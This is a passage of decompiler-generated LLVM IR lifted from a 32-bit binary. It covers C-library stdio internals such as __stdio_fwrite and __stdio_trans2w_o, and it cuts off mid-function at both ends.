dec_label_pc_80521a3:                             ; preds = %dec_label_pc_80521b5, %dec_label_pc_805219e
  %v2_80521a7 = phi i32 [ %v1_80521b1, %dec_label_pc_80521b5 ], [ %v1_805219a, %dec_label_pc_805219e ]
  %v4_80521a3 = phi i32 [ %v4_80521a3.pre, %dec_label_pc_80521b5 ], [ %v2_805219a, %dec_label_pc_805219e ]
  %v0_80521a3 = phi i32 [ %v1_80521b5, %dec_label_pc_80521b5 ], [ %v0_80521a3.pre, %dec_label_pc_805219e ]
  %v1_80521a3 = inttoptr i32 %v0_80521a3 to i8*
  %v2_80521a3 = load i8, i8* %v1_80521a3, align 1
  %v3_80521a3 = zext i8 %v2_80521a3 to i32
  %v5_80521a3 = and i32 %v4_80521a3, -256
  %v6_80521a3 = or i32 %v3_80521a3, %v5_80521a3
  store i32 %v6_80521a3, i32* %eax.global-to-local, align 4
  %v10_80521a5 = icmp eq i8 %v2_80521a3, 10
  store i1 %v10_80521a5, i1* %zf.global-to-local, align 1
  %v3_80521a7 = inttoptr i32 %v2_80521a7 to i8*
  store i8 %v2_80521a3, i8* %v3_80521a7, align 1
  %v0_80521a9 = load i1, i1* %zf.global-to-local, align 1
  %v1_80521a9 = icmp eq i1 %v0_80521a9, false
  br i1 %v1_80521a9, label %dec_label_pc_80521b1, label %dec_label_pc_80521ab

dec_label_pc_80521ab:                             ; preds = %dec_label_pc_80521a3
  %v0_80521ab = load i32, i32* %ebp.global-to-local, align 4
  %v1_80521ab = add i32 %v0_80521ab, 1
  %v2_80521ab = inttoptr i32 %v1_80521ab to i8*
  %v3_80521ab = load i8, i8* %v2_80521ab, align 1
  %v4_80521ab = urem i8 %v3_80521ab, 2
  %v5_80521ab = icmp eq i8 %v4_80521ab, 0
  store i1 %v5_80521ab, i1* %zf.global-to-local, align 1
  %v1_80521af = icmp eq i1 %v5_80521ab, false
  br i1 %v1_80521af, label %dec_label_pc_80521ab.dec_label_pc_80521b8_crit_edge, label %dec_label_pc_80521b1

dec_label_pc_80521ab.dec_label_pc_80521b8_crit_edge: ; preds = %dec_label_pc_80521ab
  %v0_80521b8.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80521b8

dec_label_pc_80521b1:                             ; preds = %dec_label_pc_80521ab, %dec_label_pc_80521a3
  %v0_80521b1 = load i32, i32* @edx, align 4
  %v1_80521b1 = add i32 %v0_80521b1, 1
  store i32 %v1_80521b1, i32* @edx, align 4
  %v0_80521b2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521b2 = add i32 %v0_80521b2, -1
  %v8_80521b2 = icmp eq i32 %v1_80521b2, 0
  store i1 %v8_80521b2, i1* %zf.global-to-local, align 1
  store i32 %v1_80521b2, i32* %esi.global-to-local, align 4
  br i1 %v8_80521b2, label %dec_label_pc_80521b1.dec_label_pc_80521b8_crit_edge, label %dec_label_pc_80521b5

dec_label_pc_80521b1.dec_label_pc_80521b8_crit_edge: ; preds = %dec_label_pc_80521b1
  %v1_80521b8.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80521b8

dec_label_pc_80521b5:                             ; preds = %dec_label_pc_80521b1
  %v0_80521b5 = load i32, i32* @edi, align 4
  %v1_80521b5 = add i32 %v0_80521b5, 1
  %v8_80521b5 = icmp eq i32 %v1_80521b5, 0
  store i1 %v8_80521b5, i1* %zf.global-to-local, align 1
  store i32 %v1_80521b5, i32* @edi, align 4
  %v4_80521a3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80521a3

dec_label_pc_80521b8:                             ; preds = %dec_label_pc_80521b1.dec_label_pc_80521b8_crit_edge, %dec_label_pc_80521ab.dec_label_pc_80521b8_crit_edge
  %v1_80521b8 = phi i32 [ %v0_80521ab, %dec_label_pc_80521ab.dec_label_pc_80521b8_crit_edge ], [ %v1_80521b8.pre, %dec_label_pc_80521b1.dec_label_pc_80521b8_crit_edge ]
  %v0_80521b8 = phi i32 [ %v0_80521b8.pre, %dec_label_pc_80521ab.dec_label_pc_80521b8_crit_edge ], [ %v1_80521b1, %dec_label_pc_80521b1.dec_label_pc_80521b8_crit_edge ]
  %v2_80521b8 = add i32 %v1_80521b8, 16
  %v3_80521b8 = inttoptr i32 %v2_80521b8 to i32*
  store i32 %v0_80521b8, i32* %v3_80521b8, align 4
  %v0_80521bb = load i32, i32* @edx, align 4
  %v1_80521bb = load i32, i32* %ebp.global-to-local, align 4
  %v2_80521bb = add i32 %v1_80521bb, 8
  %v3_80521bb = inttoptr i32 %v2_80521bb to i32*
  %v4_80521bb = load i32, i32* %v3_80521bb, align 4
  %v5_80521bb = sub i32 %v0_80521bb, %v4_80521bb
  store i32 %v5_80521bb, i32* @edx, align 4
  %v0_80521be = load i32, i32* @ebx, align 4
  %v2_80521be = sub i32 %v0_80521be, %v5_80521bb
  %v12_80521be = icmp eq i32 %v2_80521be, 0
  store i1 %v12_80521be, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80521c0

dec_label_pc_80521c0:                             ; preds = %dec_label_pc_805218a, %dec_label_pc_80521b8
  %v4_80521c0 = phi i32 [ %v2_80521be, %dec_label_pc_80521b8 ], [ %v4_80521c0.pre, %dec_label_pc_805218a ]
  %v5_80521c0 = sub i32 %arg3, %v4_80521c0
  %v15_80521c0 = icmp eq i32 %v5_80521c0, 0
  store i1 %v15_80521c0, i1* %zf.global-to-local, align 1
  %v0_80521c8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80521c4

dec_label_pc_80521c4:                             ; preds = %dec_label_pc_8052184, %entry, %dec_label_pc_80521c0
  %v0_80521c8 = phi i32 [ %v0_80521c8.pre, %dec_label_pc_80521c0 ], [ %v15_8052154, %entry ], [ %v15_8052154, %dec_label_pc_8052184 ]
  %stack_var_12.0 = phi i32 [ %v5_80521c0, %dec_label_pc_80521c0 ], [ 0, %entry ], [ %arg3, %dec_label_pc_8052184 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_80521c8 = icmp eq i32 %v0_80521c8, -12
  store i1 %v9_80521c8, i1* %zf.global-to-local, align 1
  store i32 %v0_8052153, i32* @ebx, align 4
  store i32 %v0_8052151, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_80521b5, { 1, 2, 0 }
  uselistorder i32 %v1_80521b2, { 1, 0 }
  uselistorder i32 %v1_80521b1, { 0, 2, 1 }
  uselistorder i8 %v2_80521a3, { 1, 0, 2 }
  uselistorder i32 %v4_80521c0.pre, { 2, 0, 1 }
  uselistorder i32 %v2_805219a, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_8052186, { 1, 0 }
  uselistorder i32 %v2_8052184, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8052178, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_80521c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80521c0, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80521d0 = load i32, i32* @ebp, align 4
  %v0_80521d1 = load i32, i32* @edi, align 4
  %v0_80521d2 = load i32, i32* @esi, align 4
  %v0_80521d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80521d3, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_80521e3 = add i32 %arg3, 1
  %v2_80521e3 = inttoptr i32 %v1_80521e3 to i8*
  %v3_80521e3 = load i8, i8* %v2_80521e3, align 1
  %v4_80521e3 = and i8 %v3_80521e3, 2
  %v5_80521e3 = icmp eq i8 %v4_80521e3, 0
  %v1_80521e7 = icmp eq i1 %v5_80521e3, false
  br i1 %v1_80521e7, label %dec_label_pc_8052298, label %dec_label_pc_80521ed

dec_label_pc_80521ed:                             ; preds = %entry
  %v1_80521ed = add i32 %arg3, 4
  %v2_80521ed = inttoptr i32 %v1_80521ed to i32*
  %v3_80521ed = load i32, i32* %v2_80521ed, align 4
  %v13_80521ed = icmp eq i32 %v3_80521ed, -2
  %v1_80521f1 = add i32 %arg3, 16
  %v2_80521f1 = inttoptr i32 %v1_80521f1 to i32*
  %v3_80521f1 = load i32, i32* %v2_80521f1, align 4
  store i32 %v3_80521f1, i32* @edx, align 4
  %v1_80521f4 = add i32 %arg3, 12
  %v2_80521f4 = inttoptr i32 %v1_80521f4 to i32*
  %v3_80521f4 = load i32, i32* %v2_80521f4, align 4
  store i32 %v3_80521f4, i32* %eax.global-to-local, align 4
  %v1_80521f7 = icmp eq i1 %v13_80521ed, false
  %v2_8052216 = sub i32 %v3_80521f4, %v3_80521f1
  br i1 %v1_80521f7, label %dec_label_pc_8052216, label %dec_label_pc_80521f9

dec_label_pc_80521f9:                             ; preds = %dec_label_pc_80521ed
  %tmp = icmp uge i32 %v2_8052216, %arg2
  %v5_8052200 = select i1 %tmp, i32 %arg2, i32 %v2_8052216
  store i32 %v5_8052200, i32* %ebx.global-to-local, align 4
  %v3_8052206 = inttoptr i32 %v3_80521f1 to i16*
  %v4_8052206 = call i32 @memcpy(i16* %v3_8052206, i32 %v5_8052200, i32 %v3_80521f4)
  store i32 %v4_8052206, i32* %eax.global-to-local, align 4
  %v0_805220e = load i32, i32* @esi, align 4
  %v1_805220e = add i32 %v0_805220e, 16
  %v2_805220e = inttoptr i32 %v1_805220e to i32*
  %v3_805220e = load i32, i32* %v2_805220e, align 4
  %v4_805220e = load i32, i32* %ebx.global-to-local, align 4
  %v5_805220e = add i32 %v4_805220e, %v3_805220e
  store i32 %v5_805220e, i32* %v2_805220e, align 4
  br label %dec_label_pc_80522b0

dec_label_pc_8052216:                             ; preds = %dec_label_pc_80521ed
  store i32 %v2_8052216, i32* %eax.global-to-local, align 4
  %v6_805221a = icmp ult i32 %v2_8052216, %arg2
  br i1 %v6_805221a, label %dec_label_pc_805227f, label %dec_label_pc_805221c

dec_label_pc_805221c:                             ; preds = %dec_label_pc_8052216
  %v0_805221c = load i32, i32* @ecx, align 4
  %v3_8052220 = inttoptr i32 %v3_80521f1 to i16*
  %v4_8052220 = call i32 @memcpy(i16* %v3_8052220, i32 %arg2, i32 %v0_805221c)
  store i32 %v4_8052220, i32* %eax.global-to-local, align 4
  %v0_8052228 = load i32, i32* @esi, align 4
  %v1_8052228 = add i32 %v0_8052228, 16
  %v2_8052228 = inttoptr i32 %v1_8052228 to i32*
  %v3_8052228 = load i32, i32* %v2_8052228, align 4
  %v4_8052228 = load i32, i32* @edi, align 4
  %v5_8052228 = add i32 %v4_8052228, %v3_8052228
  store i32 %v5_8052228, i32* %v2_8052228, align 4
  %v0_805222b = load i32, i32* @esi, align 4
  %v1_805222b = add i32 %v0_805222b, 1
  %v2_805222b = inttoptr i32 %v1_805222b to i8*
  %v3_805222b = load i8, i8* %v2_805222b, align 1
  %v4_805222b = urem i8 %v3_805222b, 2
  %v5_805222b = icmp eq i8 %v4_805222b, 0
  br i1 %v5_805222b, label %dec_label_pc_80522b0, label %dec_label_pc_8052231

dec_label_pc_8052231:                             ; preds = %dec_label_pc_805221c
  %v0_8052231 = load i32, i32* @edx, align 4
  %v0_8052232 = load i32, i32* @edi, align 4
  %v4_8052236 = call i32 @memrchr(i8 10, i32 %v0_8052232, i32 %v0_8052231)
  store i32 %v4_8052236, i32* %eax.global-to-local, align 4
  %v1_805223e = icmp eq i32 %v4_8052236, 0
  br i1 %v1_805223e, label %dec_label_pc_80522b0, label %dec_label_pc_8052242

dec_label_pc_8052242:                             ; preds = %dec_label_pc_8052231
  %v0_8052245 = load i32, i32* @esi, align 4
  %v1_8052246 = call i32 @__stdio_wcommit(i32 %v0_8052245)
  store i32 %v1_8052246, i32* %eax.global-to-local, align 4
  %v1_805224e = icmp eq i32 %v1_8052246, 0
  br i1 %v1_805224e, label %dec_label_pc_80522b0, label %dec_label_pc_8052252

dec_label_pc_8052252:                             ; preds = %dec_label_pc_8052242
  %v0_8052252 = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_8052252, %v1_8052246
  %v5_8052256 = select i1 %tmp20, i32 %v0_8052252, i32 %v1_8052246
  store i32 %v5_8052256, i32* %ebx.global-to-local, align 4
  %v2_805225b = sub i32 %v0_8052252, %v5_8052256
  store i32 %v2_805225b, i32* %eax.global-to-local, align 4
  %v0_805225d = load i32, i32* @ebp, align 4
  %v2_805225d = add i32 %v0_805225d, %v2_805225b
  store i32 %v2_805225d, i32* %ebp.global-to-local, align 4
  %v4_8052264 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_8052256, i32 %v2_805225b)
  store i32 %v4_8052264, i32* %eax.global-to-local, align 4
  %v1_805226c = icmp eq i32 %v4_8052264, 0
  store i32 %v4_8052264, i32* @edx, align 4
  br i1 %v1_805226c, label %dec_label_pc_80522b0, label %dec_label_pc_8052272

dec_label_pc_8052272:                             ; preds = %dec_label_pc_8052252
  %v0_8052272 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052272 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052272 = sub i32 %v0_8052272, %v4_8052264
  %v2_8052276 = add i32 %v2_8052272, %v1_8052272
  store i32 %v2_8052276, i32* %eax.global-to-local, align 4
  %v0_8052278 = load i32, i32* @esi, align 4
  %v1_8052278 = add i32 %v0_8052278, 16
  %v2_8052278 = inttoptr i32 %v1_8052278 to i32*
  %v3_8052278 = load i32, i32* %v2_8052278, align 4
  %v5_8052278 = sub i32 %v3_8052278, %v2_8052276
  store i32 %v5_8052278, i32* %v2_8052278, align 4
  %v0_805227b = load i32, i32* @edi, align 4
  %v1_805227b = load i32, i32* %eax.global-to-local, align 4
  %v2_805227b = sub i32 %v0_805227b, %v1_805227b
  store i32 %v2_805227b, i32* @edi, align 4
  br label %dec_label_pc_80522b0

dec_label_pc_805227f:                             ; preds = %dec_label_pc_8052216
  %v2_805227f = add i32 %arg3, 8
  %v3_805227f = inttoptr i32 %v2_805227f to i32*
  %v4_805227f = load i32, i32* %v3_805227f, align 4
  %v15_805227f = icmp eq i32 %v3_80521f1, %v4_805227f
  br i1 %v15_805227f, label %dec_label_pc_8052298, label %dec_label_pc_8052284

dec_label_pc_8052284:                             ; preds = %dec_label_pc_805227f
  %v1_8052288 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8052288, i32* %eax.global-to-local, align 4
  %v1_8052290 = icmp eq i32 %v1_8052288, 0
  br i1 %v1_8052290, label %dec_label_pc_8052284.dec_label_pc_8052298_crit_edge, label %dec_label_pc_8052294

dec_label_pc_8052284.dec_label_pc_8052298_crit_edge: ; preds = %dec_label_pc_8052284
  %v0_8052298.pre = load i32, i32* @edi, align 4
  %v0_80522a0.pre = load i32, i32* @esi, align 4
  %v2_80522a7.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052298

dec_label_pc_8052294:                             ; preds = %dec_label_pc_8052284
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80522b0

dec_label_pc_8052298:                             ; preds = %dec_label_pc_8052284.dec_label_pc_8052298_crit_edge, %dec_label_pc_805227f, %entry
  %v2_80522a7 = phi i32 [ %v2_80522a7.pre, %dec_label_pc_8052284.dec_label_pc_8052298_crit_edge ], [ %v0_80521d3, %dec_label_pc_805227f ], [ %v0_80521d3, %entry ]
  %v0_80522a0 = phi i32 [ %v0_80522a0.pre, %dec_label_pc_8052284.dec_label_pc_8052298_crit_edge ], [ %arg3, %dec_label_pc_805227f ], [ %arg3, %entry ]
  %v0_8052298 = phi i32 [ %v0_8052298.pre, %dec_label_pc_8052284.dec_label_pc_8052298_crit_edge ], [ %arg2, %dec_label_pc_805227f ], [ %arg2, %entry ]
  store i32 %v2_80522a7, i32* @ebx, align 4
  store i32 %v0_80521d1, i32* @edi, align 4
  %v4_80522ab = inttoptr i32 %v0_80522a0 to i16*
  %v5_80522ab = call i32 @__stdio_WRITE(i16* %v4_80522ab, i32 %v0_8052298, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80522ab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80522b0

dec_label_pc_80522b0:                             ; preds = %dec_label_pc_8052252, %dec_label_pc_8052242, %dec_label_pc_8052231, %dec_label_pc_805221c, %dec_label_pc_8052294, %dec_label_pc_8052272, %dec_label_pc_80521f9, %dec_label_pc_8052298
  %v0_80522b3 = load i32, i32* @edi, align 4
  store i32 %v0_80522b3, i32* %eax.global-to-local, align 4
  %v2_80522b5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80522b5, i32* @ebx, align 4
  store i32 %v0_80521d2, i32* @esi, align 4
  store i32 %v0_80521d1, i32* @edi, align 4
  store i32 %v0_80521d0, i32* @ebp, align 4
  ret i32 %v0_80522b3

; uselistorder directives
  uselistorder i32 %v2_8052276, { 1, 0 }
  uselistorder i32 %v0_8052252, { 2, 1, 0 }
  uselistorder i32 %v1_8052246, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8052216, { 2, 3, 1, 0 }
  uselistorder i32 %v3_80521f1, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_80521d1, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_80522b0, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80522bc = load i32, i32* @ebx, align 4
  %v4_80522c0 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80522c0, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_80522c8 = load i16, i16* %arg1, align 2
  %v3_80522c8 = zext i16 %v2_80522c8 to i32
  store i32 %v3_80522c8, i32* %eax.global-to-local, align 4
  %v2_80522cb = and i32 %v3_80522c8, %arg2
  %v3_80522cb = icmp eq i32 %v2_80522cb, 0
  %v1_80522cd = icmp eq i1 %v3_80522cb, false
  br i1 %v1_80522cd, label %dec_label_pc_80522db, label %dec_label_pc_80522cf

dec_label_pc_80522cf:                             ; preds = %entry
  %v1_80522cf = and i32 %v3_80522c8, 2176
  %v2_80522cf = icmp eq i32 %v1_80522cf, 0
  %v1_80522d4 = icmp eq i1 %v2_80522cf, false
  br i1 %v1_80522d4, label %dec_label_pc_80522e3, label %dec_label_pc_80522d6

dec_label_pc_80522d6:                             ; preds = %dec_label_pc_80522cf
  %v2_80522d6 = or i32 %v3_80522c8, %arg2
  store i32 %v2_80522d6, i32* %eax.global-to-local, align 4
  %v1_80522d8 = trunc i32 %v2_80522d6 to i16
  store i16 %v1_80522d8, i16* %arg1, align 2
  %v0_80522db.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80522db

dec_label_pc_80522db:                             ; preds = %entry, %dec_label_pc_80522d6
  %v0_8052324 = phi i32 [ %v4_80522c0, %entry ], [ %v0_80522db.pre, %dec_label_pc_80522d6 ]
  %v1_80522db = inttoptr i32 %v0_8052324 to i16*
  %v2_80522db = load i16, i16* %v1_80522db, align 2
  %v3_80522db = zext i16 %v2_80522db to i32
  store i32 %v3_80522db, i32* %edx.global-to-local, align 4
  %v2_80522de = and i16 %v2_80522db, 32
  %v3_80522de = icmp eq i16 %v2_80522de, 0
  br i1 %v3_80522de, label %dec_label_pc_80522fb, label %dec_label_pc_80522e3

dec_label_pc_80522e3:                             ; preds = %dec_label_pc_80522db, %dec_label_pc_80522cf
  %v1_80522e3 = call i32 @__errno_location(i32 %v0_80522bc)
  store i32 %v1_80522e3, i32* %eax.global-to-local, align 4
  %v1_80522e8 = inttoptr i32 %v1_80522e3 to i32*
  store i32 9, i32* %v1_80522e8, align 4
  br label %dec_label_pc_80522ee

dec_label_pc_80522ee:                             ; preds = %dec_label_pc_8052312, %dec_label_pc_80522e3
  %v0_80522ee = load i32, i32* @ebx, align 4
  %v1_80522ee = inttoptr i32 %v0_80522ee to i32*
  %v2_80522ee = load i32, i32* %v1_80522ee, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_80522f3 = or i32 %v2_80522ee, 8
  store i32 %v1_80522f3, i32* %eax.global-to-local, align 4
  %v1_80522f6 = trunc i32 %v1_80522f3 to i16
  %v3_80522f6 = inttoptr i32 %v0_80522ee to i16*
  store i16 %v1_80522f6, i16* %v3_80522f6, align 2
  br label %dec_label_pc_805235d

dec_label_pc_80522fb:                             ; preds = %dec_label_pc_80522db
  %v2_80522fb = urem i16 %v2_80522db, 4
  %v3_80522fb = icmp eq i16 %v2_80522fb, 0
  br i1 %v3_80522fb, label %dec_label_pc_8052345, label %dec_label_pc_8052300

dec_label_pc_8052300:                             ; preds = %dec_label_pc_80522fb
  %v2_8052300 = and i32 %v3_80522db, 4
  %v3_8052300 = icmp eq i32 %v2_8052300, 0
  %v1_8052303 = icmp eq i1 %v3_8052300, false
  br i1 %v1_8052303, label %dec_label_pc_8052331, label %dec_label_pc_8052305

dec_label_pc_8052305:                             ; preds = %dec_label_pc_8052300
  %v1_8052305 = add i32 %v0_8052324, 20
  %v2_8052305 = inttoptr i32 %v1_8052305 to i32*
  %v3_8052305 = load i32, i32* %v2_8052305, align 4
  store i32 %v3_8052305, i32* %eax.global-to-local, align 4
  %v2_8052308 = add i32 %v0_8052324, 16
  %v3_8052308 = inttoptr i32 %v2_8052308 to i32*
  %v4_8052308 = load i32, i32* %v3_8052308, align 4
  %v15_8052308 = icmp eq i32 %v3_8052305, %v4_8052308
  %v1_805230b = icmp eq i1 %v15_8052308, false
  br i1 %v1_805230b, label %dec_label_pc_8052312, label %dec_label_pc_805230d

dec_label_pc_805230d:                             ; preds = %dec_label_pc_8052305
  %v2_805230d = and i32 %v3_80522db, 2
  %v3_805230d = icmp eq i32 %v2_805230d, 0
  br i1 %v3_805230d, label %dec_label_pc_8052331, label %dec_label_pc_8052312

dec_label_pc_8052312:                             ; preds = %dec_label_pc_805230d, %dec_label_pc_8052305
  %v1_8052312 = and i32 %v3_80522db, 1024
  store i32 %v1_8052312, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_8052312, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_8052325 = call i32 @__GI_fseek(i32 %v0_8052324, i32 0, i32 %tmp17, i32 %v1_8052312)
  store i32 %v5_8052325, i32* %eax.global-to-local, align 4
  %v1_805232d = icmp eq i32 %v5_8052325, 0
  %v1_805232f = icmp eq i1 %v1_805232d, false
  br i1 %v1_805232f, label %dec_label_pc_80522ee, label %dec_label_pc_8052312.dec_label_pc_8052331_crit_edge

dec_label_pc_8052312.dec_label_pc_8052331_crit_edge: ; preds = %dec_label_pc_8052312
  %v0_8052331.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052331

dec_label_pc_8052331:                             ; preds = %dec_label_pc_8052312.dec_label_pc_8052331_crit_edge, %dec_label_pc_805230d, %dec_label_pc_8052300
  %v2_8052336 = phi i32 [ %v0_8052331.pre, %dec_label_pc_8052312.dec_label_pc_8052331_crit_edge ], [ %v0_8052324, %dec_label_pc_805230d ], [ %v0_8052324, %dec_label_pc_8052300 ]
  %v1_8052331 = inttoptr i32 %v2_8052336 to i32*
  %v2_8052331 = load i32, i32* %v1_8052331, align 4
  %v1_8052333 = and i32 %v2_8052331, -4
  store i32 %v1_8052333, i32* %eax.global-to-local, align 4
  %v1_8052336 = trunc i32 %v1_8052333 to i16
  %v3_8052336 = inttoptr i32 %v2_8052336 to i16*
  store i16 %v1_8052336, i16* %v3_8052336, align 2
  %v0_8052339 = load i32, i32* @ebx, align 4
  %v1_8052339 = add i32 %v0_8052339, 8
  %v2_8052339 = inttoptr i32 %v1_8052339 to i32*
  %v3_8052339 = load i32, i32* %v2_8052339, align 4
  store i32 %v3_8052339, i32* %eax.global-to-local, align 4
  %v2_805233c = add i32 %v0_8052339, 24
  %v3_805233c = inttoptr i32 %v2_805233c to i32*
  store i32 %v3_8052339, i32* %v3_805233c, align 4
  %v0_805233f = load i32, i32* %eax.global-to-local, align 4
  %v1_805233f = load i32, i32* @ebx, align 4
  %v2_805233f = add i32 %v1_805233f, 16
  %v3_805233f = inttoptr i32 %v2_805233f to i32*
  store i32 %v0_805233f, i32* %v3_805233f, align 4
  %v0_8052342 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052342 = load i32, i32* @ebx, align 4
  %v2_8052342 = add i32 %v1_8052342, 20
  %v3_8052342 = inttoptr i32 %v2_8052342 to i32*
  store i32 %v0_8052342, i32* %v3_8052342, align 4
  %v0_8052345.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052345

dec_label_pc_8052345:                             ; preds = %dec_label_pc_80522fb, %dec_label_pc_8052331
  %v2_805234c = phi i32 [ %v0_8052324, %dec_label_pc_80522fb ], [ %v0_8052345.pre, %dec_label_pc_8052331 ]
  %v1_8052345 = inttoptr i32 %v2_805234c to i32*
  %v2_8052345 = load i32, i32* %v1_8052345, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8052349 = or i32 %v2_8052345, 64
  store i32 %v1_8052349, i32* %eax.global-to-local, align 4
  %v1_805234c = trunc i32 %v1_8052349 to i16
  %v3_805234c = inttoptr i32 %v2_805234c to i16*
  store i16 %v1_805234c, i16* %v3_805234c, align 2
  %v0_805234f = load i32, i32* %eax.global-to-local, align 4
  %v1_805234f = urem i32 %v0_805234f, 65536
  store i32 %v1_805234f, i32* %eax.global-to-local, align 4
  %v3_8052352 = and i32 %v0_805234f, 2816
  %v4_8052352 = icmp eq i32 %v3_8052352, 0
  %v1_8052355 = icmp eq i1 %v4_8052352, false
  br i1 %v1_8052355, label %dec_label_pc_805235d, label %dec_label_pc_8052357

dec_label_pc_8052357:                             ; preds = %dec_label_pc_8052345
  %v0_8052357 = load i32, i32* @ebx, align 4
  %v1_8052357 = add i32 %v0_8052357, 12
  %v2_8052357 = inttoptr i32 %v1_8052357 to i32*
  %v3_8052357 = load i32, i32* %v2_8052357, align 4
  store i32 %v3_8052357, i32* %eax.global-to-local, align 4
  %v2_805235a = add i32 %v0_8052357, 28
  %v3_805235a = inttoptr i32 %v2_805235a to i32*
  store i32 %v3_8052357, i32* %v3_805235a, align 4
  br label %dec_label_pc_805235d

dec_label_pc_805235d:                             ; preds = %dec_label_pc_8052345, %dec_label_pc_80522ee, %dec_label_pc_8052357
  %v0_805235d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805235d, i32* %eax.global-to-local, align 4
  %v2_805235f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805235f, i32* %edx.global-to-local, align 4
  store i32 %v0_80522bc, i32* @ebx, align 4
  ret i32 %v0_805235d

; uselistorder directives
  uselistorder i32 %v0_805234f, { 1, 0 }
  uselistorder i32 %v1_8052312, { 1, 0, 2 }
  uselistorder i32 %v0_8052324, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_80522c8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80522bc, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 16, 4, 7, 6, 17, 5, 2, 3, 10, 9, 1, 11, 8, 13, 14, 15, 12 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805235d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052345, { 1, 0 }
  uselistorder label %dec_label_pc_80522db, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8052364 = icmp slt i32 %tmp5, 0
  %v3_8052395 = and i32 %tmp4, 2048
  %v4_8052395 = icmp eq i32 %v3_8052395, 0
  br i1 %v5_8052364, label %dec_label_pc_8052395, label %dec_label_pc_8052373

dec_label_pc_8052373:                             ; preds = %entry
  %v1_8052376 = icmp eq i1 %v4_8052395, false
  br i1 %v1_8052376, label %dec_label_pc_805239a, label %dec_label_pc_8052378

dec_label_pc_8052378:                             ; preds = %dec_label_pc_8052373
  %v6_8052378 = icmp eq i32 %tmp4, 256
  %v1_805237e = inttoptr i32 %tmp to i32*
  %v2_805237e = load i32, i32* %v1_805237e, align 4
  %v1_8052380 = icmp eq i1 %v6_8052378, false
  br i1 %v1_8052380, label %dec_label_pc_8052387, label %dec_label_pc_8052382

dec_label_pc_8052382:                             ; preds = %dec_label_pc_8052378
  %v1_8052382 = urem i32 %v2_805237e, 256
  br label %dec_label_pc_8052392

